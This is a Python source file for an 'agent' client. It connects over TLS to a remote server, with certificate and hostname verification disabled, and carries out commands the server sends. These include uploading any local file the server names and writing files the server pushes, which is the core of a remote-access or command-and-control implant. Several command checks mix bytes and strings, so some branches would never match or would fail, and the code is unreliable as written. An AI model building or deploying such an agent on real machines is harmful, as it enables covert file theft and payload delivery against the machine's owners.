import socket
import ssl
import time
import platform
from src.client.utils.config import logger
from utils.socket_utils import readline
from utils.file_utils import FileUtils


class AgentClient:
    def __init__(self, server_host: str, server_port: int) -> None:
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = False

    def _create_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        return ctx

    def connect(self):
        ctx = self._create_context()

        raw_sock = socket.create_connection(
            (self.server_host, self.server_port),
            timeout=10
        )

        self.sock = ctx.wrap_socket(raw_sock)
        self.sock.settimeout(None)

        self.running = True
        logger.debug("[agent] Connected to %s:%d", self.server_host, self.server_port)

    def run(self):
        if not self.sock:
            raise RuntimeError("Not connected")

        # Optional: say hello so server sees you
        self._send_line("Agent Connected")

        try:
            while self.running:
                chunk = readline(self.sock)

                if not chunk:
                    continue

                self._handle_command(chunk)
        except KeyboardInterrupt:
            logger.debug("[agent] CTRL+C pressed, exiting")
        except Exception as e:
            logger.debug("[agent] %s", e)
        finally:
            self.close()

    def _handle_command(self, cmd):
        logger.info("[agent] Received command: %r", cmd)

        if cmd == "help":
            self._send_line(
                "commands: help, ping, os, time, echo <text>, quit"
            )

        elif cmd.decode('utf-8').startswith("download "):
            filepath = cmd.split()[1].decode('utf-8')
            logger.debug(f"[agent] Downloading File {filepath}")
            self._send_file(filepath)

        elif cmd.decode('utf-8').startswith("SEND_FILE "):
            filename = cmd.split()[1].decode("utf-8")
            FileUtils.download_file(self.sock, filename)

        elif cmd == "ping":
            self._send_line("pong")

        elif cmd == "os":
            self._send_line(f"os={platform.system()} release={platform.release()}")

        elif cmd == "time":
            self._send_line(time.strftime("%Y-%m-%d %H:%M:%S"))

        elif cmd.startswith("echo "):
            self._send_line(cmd[5:])

        elif cmd == "quit":
            self._send_line("bye")
            self.running = False

        else:
            self._send_line("error: unknown command (try: help)")

    def _send_file(self, filename: str):
        try:
            FileUtils.send_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in sendfile %s", e)

    def _send_line(self, text):
        data = (text + "\n").encode("utf-8")
        try:
            self.sock.sendall(data)
        except OSError:
            self.running = False

    def close(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        logger.debug("[agent] Closed")
